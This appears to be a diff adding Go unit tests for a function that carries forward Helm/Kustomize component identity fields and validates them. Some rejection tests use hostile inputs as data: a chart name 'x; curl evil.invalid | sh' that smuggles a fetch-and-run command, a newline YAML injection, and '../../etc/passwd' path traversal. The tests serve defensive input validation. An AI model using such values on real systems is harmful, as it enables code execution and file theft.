@@ -2227,6 +2227,185 @@ func TestApplyInheritedIdentity(t *testing.T) {
 	}
 }
 
+// TestApplyInheritedIdentityRegistryFields verifies that chart, source, path
+// and the manifest file set survive a registry whose defaults have moved, and
+// that configuration (version, tag) does not.
+func TestApplyInheritedIdentityRegistryFields(t *testing.T) {
+	tests := []struct {
+		name  string
+		ref   ComponentRef
+		prior ComponentRef
+		want  ComponentRef
+	}{
+		{
+			name: "helm chart and source are restored, version is not",
+			ref: ComponentRef{Name: "c", Type: ComponentTypeHelm, Chart: "new-chart",
+				Source: "https://new.example", Version: "2.0.0"},
+			prior: ComponentRef{Name: "c", Type: ComponentTypeHelm, Chart: "old-chart",
+				Source: "https://old.example", Version: "1.0.0"},
+			want: ComponentRef{Name: "c", Type: ComponentTypeHelm, Chart: "old-chart",
+				Source: "https://old.example", Version: "2.0.0"},
+		},
+		{
+			name:  "kustomize path is restored, tag is not",
+			ref:   ComponentRef{Name: "c", Type: ComponentTypeKustomize, Path: "deploy/new", Tag: "v2"},
+			prior: ComponentRef{Name: "c", Type: ComponentTypeKustomize, Path: "deploy/old", Tag: "v1"},
+			want:  ComponentRef{Name: "c", Type: ComponentTypeKustomize, Path: "deploy/old", Tag: "v2"},
+		},
+		{
+			name:  "a dropped manifest file is restored",
+			ref:   ComponentRef{Name: "c", ManifestFiles: []string{"a.yaml"}},
+			prior: ComponentRef{Name: "c", ManifestFiles: []string{"a.yaml", "b.yaml"}},
+			want:  ComponentRef{Name: "c", ManifestFiles: []string{"a.yaml", "b.yaml"}},
+		},
+		{
+			name:  "an empty prior manifest set keeps the default",
+			ref:   ComponentRef{Name: "c", ManifestFiles: []string{"a.yaml"}},
+			prior: ComponentRef{Name: "c"},
+			want:  ComponentRef{Name: "c", ManifestFiles: []string{"a.yaml"}},
+		},
+		{
+			name:  "a dropped pre-manifest file is restored and an added one is left out",
+			ref:   ComponentRef{Name: "c", PreManifestFiles: []string{"a.yaml", "new.yaml"}},
+			prior: ComponentRef{Name: "c", PreManifestFiles: []string{"a.yaml", "b.yaml"}},
+			want:  ComponentRef{Name: "c", PreManifestFiles: []string{"a.yaml", "b.yaml"}},
+		},
+		{
+			name:  "an empty prior pre-manifest set keeps the default",
+			ref:   ComponentRef{Name: "c", PreManifestFiles: []string{"a.yaml"}},
+			prior: ComponentRef{Name: "c"},
+			want:  ComponentRef{Name: "c", PreManifestFiles: []string{"a.yaml"}},
+		},
+		{
+			name:  "empty prior chart, source and path do not clobber the defaults",
+			ref:   ComponentRef{Name: "c", Chart: "chart", Source: "https://x.example", Path: "p"},
+			prior: ComponentRef{Name: "c"},
+			want:  ComponentRef{Name: "c", Chart: "chart", Source: "https://x.example", Path: "p"},
+		},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			refs := []ComponentRef{tt.ref}
+			if err := ApplyInheritedIdentity(refs, []ComponentRef{tt.prior}); err != nil {
+				t.Fatalf("ApplyInheritedIdentity() error = %v", err)
+			}
+			if !reflect.DeepEqual(refs[0], tt.want) {
+				t.Errorf("ref = %+v, want %+v", refs[0], tt.want)
+			}
+		})
+	}
+}
+
+func TestApplyInheritedIdentityManifestFilesDoNotAlias(t *testing.T) {
+	prior := []ComponentRef{{Name: "c", ManifestFiles: []string{"a.yaml"}, PreManifestFiles: []string{"pre.yaml"}}}
+	refs := []ComponentRef{{Name: "c"}}
+	if err := ApplyInheritedIdentity(refs, prior); err != nil {
+		t.Fatalf("ApplyInheritedIdentity() error = %v", err)
+	}
+	refs[0].ManifestFiles[0] = "mutated.yaml"
+	if prior[0].ManifestFiles[0] != "a.yaml" {
+		t.Error("mutating the inherited set changed the prior recipe's slice")
+	}
+	refs[0].PreManifestFiles[0] = "mutated.yaml"
+	if prior[0].PreManifestFiles[0] != "pre.yaml" {
+		t.Error("mutating the inherited pre-manifest set changed the prior recipe's slice")
+	}
+}
+
+func TestApplyInheritedIdentityRejects(t *testing.T) {
+	tests := []struct {
+		name    string
+		refs    []ComponentRef
+		prior   ComponentRef
+		wantErr string
+	}{
+		{"chart with shell metacharacters", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", Chart: "x; curl evil.invalid | sh"}, "valid chart name"},
+		{"chart with a newline", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", Chart: "chart\nkind: evil"}, "valid chart name"},
+		{"chart with a path separator", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", Chart: "repo/chart"}, "valid chart name"},
+		{"chart with uppercase and underscore", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", Chart: "My_Chart"}, "valid chart name"},
+		{"source with whitespace", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", Source: "https://x.example evil"}, "valid source"},
+		{"path escaping the source", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", Path: "../../etc"}, "valid path"},
+		{"manifest file escaping the data root", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", ManifestFiles: []string{"../../etc/passwd"}}, "valid path"},
+		{"absolute manifest file", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", ManifestFiles: []string{"/etc/passwd"}}, "valid path"},
+		{"pre-manifest file escaping the data root", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", PreManifestFiles: []string{"../../etc/passwd"}}, "pre-manifest file"},
+		{"absolute pre-manifest file", []ComponentRef{{Name: "c"}},
+			ComponentRef{Name: "c", PreManifestFiles: []string{"/etc/passwd"}}, "pre-manifest file"},
+	}
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			err := ApplyInheritedIdentity(tt.refs, []ComponentRef{tt.prior})
+			if err == nil || !strings.Contains(err.Error(), tt.wantErr) {
+				t.Errorf("error = %v, want it to contain %q", err, tt.wantErr)
+			}
+		})
+	}
+}
+
+func TestApplyInheritedIdentityTypeFlipKeepsOnlyNamespace(t *testing.T) {
+	refs := []ComponentRef{
+		{Name: "flipped", Type: ComponentTypeKustomize, Namespace: "new", Path: "deploy/new", Source: "https://new.example",
+			ManifestFiles: []string{"new.yaml"}},
+		{Name: "steady", Type: ComponentTypeHelm, Namespace: "new", Chart: "new-chart"},
+	}
+	prior := []ComponentRef{
+		{Name: "flipped", Type: ComponentTypeHelm, Namespace: "old", Chart: "old-chart", Source: "https://old.example",
+			ManifestFiles: []string{"old.yaml"}},
+		{Name: "steady", Type: ComponentTypeHelm, Namespace: "old", Chart: "old-chart"},
+	}
+	want := []ComponentRef{
+		{Name: "flipped", Type: ComponentTypeKustomize, Namespace: "old", Path: "deploy/new", Source: "https://new.example",
+			ManifestFiles: []string{"new.yaml"}},
+		{Name: "steady", Type: ComponentTypeHelm, Namespace: "old", Chart: "old-chart"},
+	}
+	if err := ApplyInheritedIdentity(refs, prior); err != nil {
+		t.Fatalf("ApplyInheritedIdentity() error = %v, want a type flip not to fail the other components", err)
+	}
+	if !reflect.DeepEqual(refs, want) {
+		t.Errorf("refs = %+v, want %+v", refs, want)
+	}
+}
+
+func TestApplyInheritedIdentityLeavesRefsUnmodifiedOnError(t *testing.T) {
+	refs := []ComponentRef{
+		{Name: "a", Namespace: "new-a", Chart: "new-a", ManifestFiles: []string{"new.yaml"}},
+		{Name: "b", Namespace: "new-b"},
+	}
+	want := []ComponentRef{
+		{Name: "a", Namespace: "new-a", Chart: "new-a", ManifestFiles: []string{"new.yaml"}},
+		{Name: "b", Namespace: "new-b"},
+	}
+	prior := []ComponentRef{
+		{Name: "a", Namespace: "old-a", Chart: "old-a", ManifestFiles: []string{"old.yaml"}},
+		{Name: "b", Chart: "x; curl evil.invalid | sh"},
+	}
+	if err := ApplyInheritedIdentity(refs, prior); err == nil {
+		t.Fatal("ApplyInheritedIdentity() error = nil, want a rejection of component b")
+	}
+	if !reflect.DeepEqual(refs, want) {
+		t.Errorf("refs = %+v after a rejected artifact, want them unmodified: %+v", refs, want)
+	}
+}
+
+func TestApplyInheritedIdentityIgnoresInvalidUnmatchedPrior(t *testing.T) {
+	refs := []ComponentRef{{Name: "c", Namespace: "ns", Chart: "chart"}}
+	prior := []ComponentRef{{Name: "gone", Chart: "x; curl evil.invalid | sh"}}
+	if err := ApplyInheritedIdentity(refs, prior); err != nil {
+		t.Fatalf("ApplyInheritedIdentity() error = %v, want nil for a prior component absent from the recipe", err)
+	}
+	if refs[0].Namespace != "ns" || refs[0].Chart != "chart" {
+		t.Errorf("refs[0] = %+v, want defaults unchanged", refs[0])
+	}
+}
+
 // TestApplyInheritedIdentityRebindsHealthCheck pins the interaction between the
 // two halves of --inherit-from: a health check is static YAML naming wherever
 // the registry currently puts the component, so a preserved namespace that left
@@ -2750,7 +2929,7 @@ func TestRecipeResultNormalizeKind(t *testing.T) {
 		t.Run(tt.name, func(t *testing.T) {
 			t.Parallel()
 
-			r := &RecipeResult{Kind: tt.kind}
+			r := &RecipeResult{APIVersion: RecipeResultAPIVersion, Kind: tt.kind}
 			err := r.NormalizeKind()
 			if (err != nil) != tt.wantErr {
 				t.Fatalf("NormalizeKind() error = %v, wantErr %v", err, tt.wantErr)
